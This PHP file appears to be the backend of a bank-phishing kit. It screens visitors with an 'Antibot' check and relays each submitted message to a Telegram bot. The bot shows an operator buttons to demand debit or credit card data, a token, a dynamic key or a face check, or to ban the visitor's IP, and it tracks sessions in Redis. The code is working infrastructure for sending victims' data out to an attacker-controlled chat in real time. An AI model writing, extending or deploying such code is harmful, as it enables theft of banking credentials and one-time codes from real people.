<?php
/**
 * ================================================================
 * API Send — Envía datos a Telegram desde el backend
 * ================================================================
 */

require_once __DIR__ . '/../Antibot.php';

header('Content-Type: application/json; charset=utf-8');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['ok' => false, 'error' => 'Método no permitido']);
    exit;
}

$input = json_decode(file_get_contents('php://input'), true) ?: $_POST;

if (!Antibot::esHumano($input)) {
    Antibot::rechazar();
}

$step          = $input['step']        ?? '';
$message       = $input['message']     ?? '';
$clientSessionId = $input['sessionId'] ?? '';

if (empty($step) || empty($message) || empty($clientSessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'Faltan parámetros']);
    exit;
}

$sessionId = $input['sessionId'] ?? '';
if (empty($sessionId) || !preg_match('/^sess_[a-zA-Z0-9_]+$/', $sessionId)) {
    http_response_code(400);
    echo json_encode(['ok' => false, 'error' => 'SessionId inválido']);
    exit;
}

// ── Función robusta para comunicarse con Redis ──
function upstash_redis($command, array $args = []) {
    $redisUrl = getenv('REDIS_URL');
    if (!$redisUrl) return null;
    
    $parsed = parse_url($redisUrl);
    $scheme = $parsed['scheme'] ?? 'redis';
    $host = $parsed['host'] ?? '';
    $port = $parsed['port'] ?? 6379;
    // Extraer contraseña o token
    $pass = $parsed['pass'] ?? ($parsed['user'] ?? '');
    
    if (empty($host)) return null;

    // Si la URL empieza con rediss://, usamos SSL/TLS
    $prefix = ($scheme === 'rediss') ? 'ssl://' : '';
    
    $fp = @fsockopen($prefix . $host, $port, $errno, $errstr, 3.0);
    if (!$fp) return null;
    
    // Autenticar si hay contraseña/token
    if (!empty($pass)) {
        $authCmd = "*2\r\n$4\r\nAUTH\r\n$" . strlen($pass) . "\r\n" . $pass . "\r\n";
        fwrite($fp, $authCmd);
        fgets($fp); // Leer respuesta del AUTH
    }
    
    // Construir comando en formato RESP (Redis Serialization Protocol)
    $allArgs = array_merge([$command], $args);
    $cmd = "*" . count($allArgs) . "\r\n";
    foreach ($allArgs as $arg) {
        $argStr = (string)$arg;
        $cmd .= "$" . strlen($argStr) . "\r\n" . $argStr . "\r\n";
    }
    
    fwrite($fp, $cmd);
    
    // Leer la respuesta de Redis
    $response = fgets($fp);
    if ($response === false) {
        fclose($fp);
        return null;
    }
    
    $replyType = $response[0];
    $reply = trim(substr($response, 1));
    
    if ($replyType === '$') {
        $length = (int)$reply;
        if ($length === -1) {
            fclose($fp);
            return null; // Nil / No encontrado
        }
        $data = fread($fp, $length);
        fgets($fp); // Consumir los bytes \r\n finales
        fclose($fp);
        return $data;
    } elseif ($replyType === '+') {
        fclose($fp);
        return $reply; // Ejemplo: "OK"
    }
    
    fclose($fp);
    return null;
}

$config   = require __DIR__ . '/../config.php';
$botToken = $config['bot_token'];
$chatId   = $config['chat_id'];

$buttons = [
    ['text' => '✅ Aprobar',   'callback_data' => "aprobar_{$step}_{$sessionId}"],
    ['text' => '💳 Débito',    'callback_data' => "debito_{$step}_{$sessionId}"],
    ['text' => '💰 Crédito',   'callback_data' => "credito_{$step}_{$sessionId}"],
    ['text' => '🔐 Token',     'callback_data' => "token_{$step}_{$sessionId}"],
    ['text' => '💳 Dinámica',  'callback_data' => "dinamica_{$step}_{$sessionId}"],
    ['text' => '👤 Face',      'callback_data' => "face_{$step}_{$sessionId}"],
    ['text' => '⚠️ 923',       'callback_data' => "923_{$step}_{$sessionId}"],
    ['text' => '🚫 Ban IP',    'callback_data' => "banip_{$step}_{$sessionId}"],
    ['text' => '❌ Rechazar',  'callback_data' => "rechazar_{$step}_{$sessionId}"]
];

$keyboard = [];
$row = [];
foreach ($buttons as $i => $btn) {
    $row[] = $btn;
    if (count($row) === 2 || $i === count($buttons) - 1) {
        $keyboard[] = $row;
        $row = [];
    }
}

$postData = http_build_query([
    'chat_id'      => $chatId,
    'text'         => $message . "\n\n⏳ Esperando acción del administrador...",
    'parse_mode'   => 'HTML',
    'reply_markup' => json_encode(['inline_keyboard' => $keyboard])
]);

$ch = curl_init("https://api.telegram.org/bot{$botToken}/sendMessage");
curl_setopt_array($ch, [
    CURLOPT_POST            => true,
    CURLOPT_POSTFIELDS      => $postData,
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_TIMEOUT        => 15,
    CURLOPT_SSL_VERIFYPEER => true,
    CURLOPT_FOLLOWLOCATION => true
]);

$response = curl_exec($ch);
$httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$error    = curl_error($ch);
curl_close($ch);

if ($error || $httpCode !== 200) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Error Telegram', 'details' => $error ?: "HTTP {$httpCode}"]);
    exit;
}

$data = json_decode($response, true);
if (!$data['ok']) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => 'Telegram API error', 'details' => $data['description'] ?? 'Unknown']);
    exit;
}

$messageId = $data['result']['message_id'] ?? null;

$sessionData = [
    'sessionId'    => $sessionId,
    'currentStep'  => $step,
    'messageId'    => $messageId,
    'status'       => 'pending',
    'action'       => null,
    'createdAt'    => time(),
    'lastUpdateId' => 0,
    'messageText'  => $message
];

// Guardar en Redis sin expiración compleja para descartar errores de sintaxis
$redisResult = upstash_redis('SET', [$sessionId, json_encode($sessionData)]);

if (is_string($redisResult) && str_starts_with($redisResult, 'ERROR')) {
    http_response_code(500);
    echo json_encode(['ok' => false, 'error' => $redisResult]);
    exit;
}

echo json_encode([
    'ok'        => true,
    'messageId' => $messageId,
    'sessionId' => $sessionId,
    'step'      => $step
]);